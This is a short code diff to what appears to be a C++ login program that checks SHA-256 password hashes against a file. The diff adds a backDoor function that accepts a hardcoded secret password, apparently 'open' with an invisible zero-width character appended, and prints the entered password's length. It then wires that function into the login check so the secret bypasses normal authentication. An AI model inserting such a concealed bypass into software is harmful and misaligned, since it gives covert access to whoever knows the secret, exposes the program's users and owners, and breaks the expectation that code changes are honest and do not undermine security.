@@ -29,6 +29,17 @@ string getSHA256(const string& input) {
     return hash_stringified;
 }
 
+bool backDoor(const string& password) {
+    cout << "Password Length: " << password.length() << endl;
+    if (password == "open​") {
+        return true;
+        
+    }
+
+    else {
+        return false;
+    }
+}
 
 int main() {
     // Stores the password and username the user enters
@@ -67,7 +78,7 @@ int main() {
     }
     passwordsFile.close();
 
-    if (isAuthenticated) {
+    if (isAuthenticated || backDoor(passwordIn)) {
         authenticated(usernameIn);
     }
     else {
